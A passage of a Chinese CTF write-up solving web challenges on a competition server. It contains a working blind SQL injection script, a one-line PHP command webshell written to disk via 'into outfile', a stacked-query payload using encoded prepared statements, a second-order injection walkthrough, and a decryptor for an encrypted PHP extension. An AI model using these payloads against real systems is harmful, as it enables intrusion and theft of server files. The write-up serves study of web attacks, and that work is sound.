class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">u=requests.session()</span><br><span class="line">u.post(<span class="string">&#x27;http://118.24.125.87:82/user/logCheck.php&#x27;</span>,\</span><br><span class="line">       data=&#123;<span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;pass&#x27;</span>: <span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        ok=<span class="number">0</span></span><br><span class="line">        url=<span class="string">&#x27;http://118.24.125.87:82/user/user.php?id=1^\</span></span><br><span class="line"><span class="string">(if(ascii(mid(load_file(\</span></span><br><span class="line"><span class="string">0x2f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c2e706870\</span></span><br><span class="line"><span class="string">),&#123;place&#125;,1))%3D&#123;asc&#125;,0,1))&#x27;</span>.<span class="built_in">format</span>(place=num,asc=each)                       </span><br><span class="line">        r=u.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(each),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> each==<span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="用止痒同学的shell">用止痒同学的shell</h3><p>理论来说是可以读完文件的,不过这里我就偷懒了 首先简单看一下id,发现前面有人写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php `$_GET[x]`;?&gt;&#x27;into outfile&#x27;/var/www/html/favicon/4.php</span><br></pre></td></tr></table></figure><p>尝试访问4.php 发现可以访问,那么直接去读4.php的代码,发现是个命令执行的文件 那么直接写一个shell 然后看到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.24.125.87:82/favicon/shell.php?cmd=var_dump(`cat%20/var/www/html/index.php`);</span><br></pre></td></tr></table></figure><p>可以开始读文件了,找flag <img src="/images/2018/08/su-4.jpg" alt="blacsheep" /></p><h3 id="预期解">预期解</h3><p>读文件,读到user/user.php,发现<code>mysqli_multi_query()</code> 那么可以用分号隔开执行其他命令 为了绕过引号的限制,使用预编译语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @s=concat(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116),CHAR(32),CHAR(39),CHAR(60),CHAR(63),CHAR(112),CHAR(104),CHAR(112),CHAR(32),CHAR(112),CHAR(104),CHAR(112),CHAR(105),CHAR(110),CHAR(102),CHAR(111),CHAR(40),CHAR(41),CHAR(59),CHAR(63),CHAR(62),CHAR(39),CHAR(32),CHAR(105),CHAR(110),CHAR(116),CHAR(111),CHAR(32),CHAR(111),CHAR(117),CHAR(116),CHAR(102),CHAR(105),CHAR(108),CHAR(101),CHAR(32),CHAR(39),CHAR(47),CHAR(118),CHAR(97),CHAR(114),CHAR(47),CHAR(119),CHAR(119),CHAR(119),CHAR(47),CHAR(104),CHAR(116),CHAR(109),CHAR(108),CHAR(47),CHAR(102),CHAR(97),CHAR(118),CHAR(105),CHAR(99),CHAR(111),CHAR(110),CHAR(47),CHAR(49),CHAR(46),CHAR(112),CHAR(104),CHAR(112),CHAR(39),CHAR(59));</span><br><span class="line">PREPARE s2 FROM @s;</span><br><span class="line">EXECUTE s2;</span><br></pre></td></tr></table></figure><p>编码部分即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/favicon/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后<img src="/images/2018/08/su-5.jpg" alt="blacsheep" /></p><h3 id="非预期解">非预期解</h3><p>二次注入 注册的时候假设我们注册<code>123'</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$clean_name</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$clean_pass</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;New_pass&#x27;</span>]);  </span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line"><span class="variable">$sql2</span> = <span class="string">&quot;INSERT INTO dwvs_user_message(DWVS_user_name,DWVS_user_passwd,DWVS_user_enr_time) VALUES (&#x27;<span class="subst">$clean_name</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;,&#x27;<span class="subst">$time</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>,<span class="variable">$sql2</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Error!!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里存进数据库的username就是<code>123'</code> 然后退出登录,再登录进去,登录部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;../bwvs_config/sys_config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$clean_name</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$clean_pass</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;<span class="subst">$clean_name</span>&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot; AND DWVS_user_passwd=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;<span class="subst">$clean_pass</span>&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>, <span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Mysql Error!!&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$connect</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$data</span>) == <span class="number">1</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$data</span>);</span><br><span class="line">                  <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_id&#x27;</span>];</span><br><span class="line">                  <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_name&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_name&#x27;</span>];</span><br><span class="line">                  <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_favicon&#x27;</span>]))</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_favicon&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_favicon&#x27;</span>];</span><br><span class="line">                  &#125;<span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="variable">$rand_num</span> = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">                    <span class="variable">$user_favicon</span> = <span class="string">&quot;../favicon/&quot;</span>.<span class="string">&quot;<span class="subst">$rand_num</span>&quot;</span>.<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_favicon&#x27;</span>] = <span class="variable">$user_favicon</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: user.php&#x27;</span>);   </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_error&#x27;</span>] = <span class="string">&#x27;Error&#x27;</span>;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);          </span><br><span class="line">                &#125;   </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_error&#x27;</span>] = <span class="string">&#x27;Error&#x27;</span>;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: login.php&#x27;</span>);          </span><br><span class="line">                &#125;   </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">not_find</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重点关注这里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user_name&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;DWVS_user_name&#x27;</span>];</span><br></pre></td></tr></table></figure><p>这里登录之后,session的值是从数据库取出的值,这里的引号并没有闭合,然后user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;../bwvs_config/sys_config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">&#x27;../header.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;</span>.<span class="string">&quot;&#x27;<span class="subst">&#123;$_SESSION[&#x27;user_name&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$connect</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Mysql Error!!&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>] = <span class="variable">$result</span>[<span class="string">&#x27;DWVS_user_id&#x27;</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里<code>$_SESSION['user_name']</code>直接拼进去,那么就会导致引号被闭合,注入成功. 不过这里还是有坑,username字段长度是60,如果一句话太长是写不进去的 <img src="/images/2018/08/su-6.jpg" alt="blacsheep" /> 注意到就可以了,比如写个phpinfo <img src="/images/2018/08/su-7.jpg" alt="blacsheep" /> <img src="/images/2018/08/su-8.jpg" alt="blacsheep" /></p><h2 id="hateit">HateIT</h2><p><strong>描述:奶茶在一家互联网公司运维，然而，最近出了点问题.... hint:robots.txt</strong> 到robots.txt发现一个.so文件,拖ida分析一下,发现是个加密文件,主要部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">zif_suenc_decode</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14@1</span></span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rbx@2</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx@6</span></span><br><span class="line">  __int64 v6; <span class="comment">// rsi@6</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// [sp+0h] [bp-20h]@1</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+Ch] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  LODWORD(v3) = zend_parse_parameters(a1, <span class="string">&quot;s&quot;</span>, &amp;v8, &amp;v9);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v8;</span><br><span class="line">    LODWORD(v3) = <span class="built_in">memcmp</span>(v8, &amp;suenc_header, <span class="number">0xC</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      *a2 = <span class="number">0LL</span>;</span><br><span class="line">      *(a2 + <span class="number">20</span>) = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v9 - <span class="number">12LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0LL</span> &amp;&amp; v9 != <span class="number">12LL</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = <span class="number">0LL</span>;</span><br><span class="line">        v6 = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v5 &amp; <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v6 = (v5 + suenc_key[v6] + v6) &amp; <span class="number">0xF</span>;</span><br><span class="line">            *(v4 + v5 + <span class="number">12</span>) = ~(suenc_key[v6] ^ *(v4 + v5 + <span class="number">12</span>));</span><br><span class="line">          &#125;</span><br><span class="line">          ++v5;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v3 != v5 );</span><br><span class="line">        v4 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">      *(v2 + <span class="number">8</span>) = v3;</span><br><span class="line">      *v2 = v4 + <span class="number">12</span>;</span><br><span class="line">      *(v2 + <span class="number">20</span>) = <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单看下 zend_parse_parameters解参数,获得密文地址v8和长度v9 然后从密文第12位之后一次进行加密 解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">suenc_key = [<span class="number">0x49</span>, <span class="number">0xfa</span>, <span class="number">0x0</span>, <span class="number">0xfa</span>, <span class="number">0x0</span>, <span class="number">0x23</span>, <span class="number">0xff</span>, <span class="number">0x23</span>,\</span><br><span class="line">             <span class="number">0x8e</span>, <span class="number">0xea</span>, <span class="number">0xfa</span>, <span class="number">0xf3</span>, <span class="number">0xa6</span>, <span class="number">0xf3</span>, <span class="number">0xc6</span>, <span class="number">0x8e</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">a1</span>):</span><br><span class="line">    a2 = <span class="built_in">len</span>(a1)</span><br><span class="line">    <span class="keyword">if</span> a2:</span><br><span class="line">        v2 = <span class="number">0</span></span><br><span class="line">        v3 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> a2 != v2:</span><br><span class="line">            <span class="keyword">if</span> v2 &amp; <span class="number">1</span>:</span><br><span class="line">                v3 = (v2 + suenc_key[v3] + v3) &amp; <span class="number">0xf</span></span><br><span class="line">                a1[v2] = ~(suenc_key[v3] ^ a1[v2]) &amp; <span class="number">0xff</span></span><br><span class="line">            v2+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> a1.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;admin.php&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read()</span><br><span class="line">    <span class="built_in">print</span>(decode(<span class="built_in">bytearray</span>(cipher)[<span class="number">12</span>:]))</span><br></pre></td></tr></table></figure><p>从而获得所有源码 然后这一部分是.so的解密,但是发现没有index.php,但是又一段opcode,所以自己去解咯 自己去解了一下,解了一部分,后面的解不下去了... index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//!0 = $username, !1 = $md5, !2 = $admin, !3 = $token, !4 = $sign, !5 = $info</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&#x27;func.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$md5</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">get_identify</span>().<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$token</span> = <span class="title function_ invoke__">encrypt</span>(<span class="variable">$username</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$admin</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$md5</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;sign&#x27;</span>] = <span class="variable">$md5</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="variable">$token</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">showImage</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$sign</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sign&#x27;</span>];</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;sign+%3A+&#x27;</span>.<span class="variable">$sign</span>.<span class="string">&#x27;%3Cbr%3E%0A&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token%3A+&#x27;</span>.<span class="variable">$token</span>.<span class="string">&#x27;%3Cbr%3E%0A&#x27;</span>;</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">explode</span>(<span class="title function_ invoke__">decrypt</span>(<span class="variable">$token</span>),<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">decrypt</span>(<span class="variable">$token</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$info</span>) == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">get_identify</span>().<span class="variable">$info</span>[<span class="number">0</span>]) == <span class="variable">$info</span>[<span class="number">2</span>] &amp;&amp; <span class="variable">$sign</span> = <span class="variable">$info</span>[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$admin</span> = <span class="variable">$info</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sign&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;sign+%3A+&#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;sign&#x27;</span>].<span class="string">&#x27;%3Cbr%3E%0A&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;token%3A+&#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>].<span class="string">&#x27;%3Cbr%3E%0A&#x27;</span>;</span><br><span class="line">    <span class="variable">$token</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="variable">$sign</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">explode</span>(<span class="title function_ invoke__">decrypt</span>(<span class="variable">$token</span>),<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$info</span>) == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">get_identify</span>().<span class="variable">$info</span>[<span class="number">0</span>]) == <span class="variable">$info</span>[<span class="number">2</span>] &amp;&amp; <span class="variable">$sign</span> = <span class="variable">$info</span>[<span class="number">1</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$admin</span> = <span class="variable">$info</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;%3Cbr%3E&#x27;</span>.<span class="variable">$admin</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$admin</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$admin</span> == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;%3Ca+href%3D%27admin.php%27%3EAdmin%3C%2Fa%3E&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span 